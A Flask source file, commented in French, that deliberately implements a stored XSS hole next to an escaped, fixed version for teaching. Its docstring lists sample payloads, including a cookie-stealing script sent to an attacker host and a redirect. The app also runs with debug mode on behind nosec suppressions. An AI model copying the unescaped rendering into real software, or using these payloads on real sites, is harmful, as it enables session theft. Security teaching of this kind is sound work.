"""
Application Flask vulnérable - XSS (Cross-Site Scripting) Demo
Cette application contient intentionnellement une vulnérabilité XSS Stored
à des fins éducatives et de démonstration de sécurité.

VULNÉRABILITÉ: Les commentaires utilisateurs ne sont PAS échappés!
"""
from flask import Flask, request, redirect, url_for
from datetime import datetime
from html import escape

app = Flask(__name__)

# Stockage en mémoire des commentaires (vulnérable!)
comments = []


@app.route('/')
def index():
    """
    Page principale avec formulaire de commentaires

    VULNÉRABILITÉ CRITIQUE: XSS Stored!
    Les commentaires sont affichés directement sans échappement HTML.
    Un attaquant peut injecter du JavaScript qui sera exécuté
    dans le navigateur de tous les visiteurs.

    Exploitation:
    - Injection simple: <script>alert('XSS')</script>
    - Vol de cookies: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
    - Redirection: <script>window.location='http://malicious-site.com'</script>
    """

    # VERSION 1: VULNÉRABLE - Sans échappement HTML
    comments_vulnerable = ""
    for comment in comments:
        # VULNÉRABILITÉ: Insertion directe sans échappement!
        comments_vulnerable += f"""
        <div style="background: #ffe6e6; padding: 10px; margin: 10px 0; border-left: 4px solid red;">
            <strong>{comment['author']}</strong> ({comment['timestamp']})<br>
            {comment['text']}
        </div>
        """

    if not comments_vulnerable:
        comments_vulnerable = '<p>Aucun commentaire.</p>'

    # VERSION 2: SÉCURISÉE - Avec échappement HTML
    comments_secure = ""
    for comment in comments:
        # CORRECTION: Échappement HTML avec escape()
        comments_secure += f"""
        <div style="background: #e6ffe6; padding: 10px; margin: 10px 0; border-left: 4px solid green;">
            <strong>{escape(comment['author'])}</strong> ({escape(comment['timestamp'])})<br>
            {escape(comment['text'])}
        </div>
        """

    if not comments_secure:
        comments_secure = '<p>Aucun commentaire.</p>'

    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>XSS Demo - Vulnérable vs Sécurisé</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: monospace; margin: 20px; }}
        .container {{ display: flex; gap: 20px; }}
        .column {{ flex: 1; }}
        .vulnerable {{ border: 3px solid red; padding: 15px; }}
        .secure {{ border: 3px solid green; padding: 15px; }}
        h2 {{ margin-top: 0; }}
        .code-block {{ background: #f5f5f5; padding: 10px; border: 1px solid #ddd; margin: 10px 0; overflow-x: auto; }}
        .highlight {{ background: yellow; }}
    </style>
</head>
<body>
    <h1>🔴 XSS Demo: Vulnérable vs 🟢 Sécurisé</h1>

    <p><strong>Payload à tester:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>

    <h2>Formulaire</h2>
    <form method="POST" action="/post">
        <label>Nom:</label>
        <input type="text" name="author" required><br><br>

        <label>Commentaire:</label>
        <textarea name="text" rows="3" cols="60" required></textarea><br><br>

        <button type="submit">Publier</button>
        <a href="/clear"><button type="button">Effacer tout</button></a>
    </form>

    <hr>

    <div class="container">
        <!-- COLONNE VULNÉRABLE -->
        <div class="column vulnerable">
            <h2>🔴 VERSION VULNÉRABLE</h2>
            <p><strong>Code Python:</strong></p>
            <pre class="code-block" style="background: #fff; color: #000;">
# VULNÉRABLE - PAS d'échappement
for comment in comments:
    html += "&lt;p&gt;" + comment['text'] + "&lt;/p&gt;"
    # ❌ Danger: Le script est exécuté!
            </pre>
            <p><strong>❌ Problème:</strong> Le texte est inséré <span class="highlight">directement sans échappement</span></p>

            <h3>Commentaires ({len(comments)})</h3>
            {comments_vulnerable}
        </div>

        <!-- COLONNE SÉCURISÉE -->
        <div class="column secure">
            <h2>🟢 VERSION SÉCURISÉE</h2>
            <p><strong>Code Python:</strong></p>
            <pre class="code-block" style="background: #fff; color: #000;">
# SÉCURISÉ - AVEC échappement
from html import escape

for comment in comments:
    html += "&lt;p&gt;" + escape(comment['text']) + "&lt;/p&gt;"
    # ✅ Le script devient du texte!
            </pre>
            <p><strong>✅ Correction:</strong> Utilisation de <code>escape()</code> pour échapper les caractères HTML</p>

            <h3>Commentaires ({len(comments)})</h3>
            {comments_secure}
        </div>
    </div>

    <hr>

    <h3>📚 Explication</h3>
    <ul>
        <li><strong>🔴 Vulnérable:</strong> <code>&lt;script&gt;</code> est interprété comme du JavaScript → XSS execute</li>
        <li><strong>🟢 Sécurisé:</strong> <code>&lt;script&gt;</code> devient <code>&amp;lt;script&amp;gt;</code> → Affiché comme texte</li>
    </ul>

    <p><strong>Autres méthodes de protection:</strong></p>
    <ul>
        <li>Content Security Policy (CSP)</li>
        <li>HTTPOnly cookies</li>
        <li>Framework templates auto-escape (Jinja2)</li>
        <li>Sanitization libraries (bleach)</li>
    </ul>
</body>
</html>
"""


@app.route('/post', methods=['POST'])
def post_comment():
    """
    Endpoint pour poster un commentaire
    VULNÉRABILITÉ: Aucune validation ni échappement du contenu!
    """
    author = request.form.get('author', 'Anonyme')
    text = request.form.get('text', '')

    if text:
        # VULNÉRABILITÉ: Stockage direct sans échappement!
        comment = {
            'author': author,
            'text': text,
            'timestamp': datetime.now().strftime('%d/%m/%Y %H:%M')
        }
        comments.append(comment)

    return redirect(url_for('index'))


@app.route('/clear')
def clear_comments():
    """Endpoint pour effacer tous les commentaires"""
    comments.clear()
    return redirect(url_for('index'))


@app.route('/health')
def health():
    """Health check endpoint pour les tests"""
    from flask import jsonify
    return jsonify({'status': 'ok', 'comments_count': len(comments)}), 200


if __name__ == '__main__':
    # nosec B201: debug=True est intentionnel pour cette démo éducative
    # nosec B104: bind sur 0.0.0.0 est nécessaire pour Docker
    app.run(host='0.0.0.0', port=8080, debug=True)  # nosec
